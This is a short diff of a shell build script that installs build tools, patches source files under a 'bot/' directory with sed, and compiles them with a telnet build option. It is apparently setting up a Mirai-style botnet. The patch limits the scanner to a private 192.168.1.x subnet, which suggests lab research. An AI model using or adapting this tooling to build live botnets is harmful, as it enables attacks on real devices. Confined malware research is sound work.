@@ -18,12 +18,13 @@ echo "[log] start apt-get install ..."	&&\
 
 apt-get update	> /dev/null 	&&\
 apt-get install -yq --no-install-recommends	\
+				build-essential \
 				electric-fence \
 				golang \
 				git \
 				ca-certificates	\
 				wget \
-				build-essential > /dev/null &&\
+				apt-utils > /dev/null &&\
 
 echo "[log] apt-get install done"	&&\
 
@@ -121,7 +122,8 @@ sed -i "53c     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_le
 sed -i "158d" ./bot/main.c	&&\
 sed -i "161d" ./bot/main.c	&&\
 sed -i "84c 	addr.sin_addr.s_addr = INET_ADDR($dns_domain);" ./bot/resolv.c	&&\
-
+sed -i "679,701d" ./bot/scanner.c &&\
+sed -i "679a     tmp = rand_next();\no1 = 192;\no2 = 168;\no3 = 1;\no4 = (tmp >> 24) & 0xff;\n" ./bot/scanner.c &&\
 ./build.sh debug telnet	&&\
 
 echo "[log] finish enc"	&&\
